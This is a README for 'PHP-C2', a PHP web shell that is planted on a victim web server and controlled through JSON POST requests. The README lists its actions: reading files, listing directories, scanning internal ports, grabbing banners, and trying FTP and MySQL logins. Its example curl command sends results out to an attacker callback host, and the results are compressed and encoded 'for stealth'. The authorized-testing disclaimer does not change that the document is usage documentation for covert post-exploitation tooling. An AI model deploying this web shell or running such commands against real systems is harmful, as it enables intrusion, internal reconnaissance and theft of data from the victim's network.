# PHP-C2

PHP Network Utility Script
This PHP script provides a JSON-controlled HTTP interface for performing a variety of system and network enumeration tasks using built-in PHP functions. It is designed for controlled environments such as penetration testing labs or internal audits.

⚠️ Important: This tool is intended for educational or authorized security testing in controlled environments only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

Features
File and directory inspection (readfile, scandir)

Port scanning on internal hosts (portscan)

HTTP(S) content fetching (http_get)

DNS resolution and PTR lookup (dns_lookup)

Banner grabbing for FTP and SSH (ftp_banner, ssh_banner)

Basic login attempts for FTP and MySQL (ftp_login, mysql_login)

SMB probe using raw TCP (smb_probe)

GZIP + Base64 encoding for stealth and compression

Usage
1. Upload the Script
Place the script on a PHP-enabled web server (e.g., /var/www/html/util.php).

2. Send a JSON Request
Send a POST request with the required JSON fields:

action: One of the supported operations

target: Hostname, IP, or file path (context-sensitive)

callback: URL to receive the result via POST

Optional fields for some modules:

username, password: Used in ftp_login or mysql_login

directory: Used in ftp_login

Example curl Usage
bash
Copy
Edit
curl -X POST http://victim.local/util.php \
  -H "Content-Type: application/json" \
  -d '{
    "action": "http_get",
    "target": "https://internal.service.local",
    "callback": "http://attacker.local:8000/callback"
}'
Your callback URL must be an endpoint capable of receiving POST data. The script compresses and base64-encodes the JSON response.

Actions Supported
Action	Description
readfile	Read file contents from path in target
scandir	List contents of a directory
portscan	TCP scan of host:port (e.g., 10.0.0.5:22)
http_get	Fetch content over HTTP(S); SSL checks disabled
dns_lookup	Resolve domain or reverse-lookup IP
ftp_banner	Get FTP server banner
ssh_banner	Get SSH server banner
mysql_login	Test MySQL connection (requires username)
ftp_login	Login to FTP and list directory contents
smb_probe	Raw TCP probe to SMB port for basic response

Things to Change or Configure
Callback URL: Your callback server must be reachable by the victim.

Permissions: Script must have access to read requested files and open sockets.

PHP Settings: Ensure allow_url_fopen is enabled, and fsockopen is allowed.

Network Access: Victim system must have internal network access to targets.

Notes
The script avoids spawning shell processes and uses only built-in PHP functions.

Responses are compressed using gzcompress and base64-encoded for stealth and transport safety.

SSL verification is disabled for http_get to bypass self-signed cert errors.

License
This tool is provided "as-is" for legal and educational use. You are responsible for complying with all laws and regulations applicable in your jurisdiction.

